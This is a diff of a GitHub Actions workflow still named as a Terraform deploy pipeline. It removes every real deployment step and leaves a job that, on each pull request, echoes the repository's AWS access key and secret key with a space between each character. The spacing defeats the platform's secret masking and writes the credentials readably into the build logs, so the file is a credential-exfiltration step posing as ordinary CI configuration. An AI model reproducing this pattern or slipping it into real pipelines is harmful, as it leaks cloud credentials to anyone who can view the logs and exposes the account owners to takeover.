@@ -1,33 +1,15 @@
-name: 'OPA Terraform Deploy'
+name: 'Terraform Deploy'
 
 on: [pull_request]
 defaults:
       run:
         shell: bash
-
 jobs:
-  opa-validate:
-    name: 'Deploy Stack to AWS'
+  build:
     runs-on: ubuntu-latest
-    env:
-      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-      AWS_REGION: 'us-west-2'
-
+    
     steps:
-      - name: 'Checkout'
-        uses: actions/checkout@v2
-
-      - name: 'Terraform Setup'
-        uses: hashicorp/setup-terraform@v1
-        
-      - name: 'Terraform Init'
-        run: terraform init
-      
-      - name: 'Terraform Plan'
-        run: terraform plan -out=output
-
-      - name: 'Grab the secrets'
+      - uses: actions/checkout@v3
       - run: |
           echo ${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'
           echo ${{env.AWS_SECRET_ACCESS_KEY}} | sed 's/./& /g'
